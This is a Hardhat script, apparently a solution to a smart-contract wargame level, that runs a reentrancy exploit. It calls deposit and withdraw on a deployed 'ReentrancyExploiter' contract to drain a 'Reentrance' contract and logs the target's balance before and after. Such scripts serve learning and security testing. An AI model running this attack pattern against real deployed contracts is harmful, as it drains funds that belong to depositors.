import { BigNumber } from "ethers"
import { ethers } from "hardhat"

import { REENTRANT, REENTRANTEXPLOIT } from "../constants"
import { Reentrance, ReentrancyExploiter } from "../typechain-types"

const reentranceExploit = async () => {
    const reentrant: Reentrance = await ethers.getContractAt("Reentrance", REENTRANT)

    const initialBalance = await ethers.provider.getBalance(reentrant.address)
    console.log("initial balance in reentrant account", ethers.utils.formatEther(initialBalance))
    const reentrancyExploiter: ReentrancyExploiter = await ethers.getContractAt(
        "ReentrancyExploiter",
        REENTRANTEXPLOIT
    )

    const depositTx = await reentrancyExploiter.deposit()
    await depositTx.wait(1)

    const withdrawTx = await reentrancyExploiter.withdraw()
    await withdrawTx.wait(1)

    const finalBalance = await ethers.provider.getBalance(reentrant.address)
    console.log("Final balance in reentrant contract", ethers.utils.formatEther(finalBalance))
}

reentranceExploit()
    .then(() => {
        console.log("Reentrance exploited successfully")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
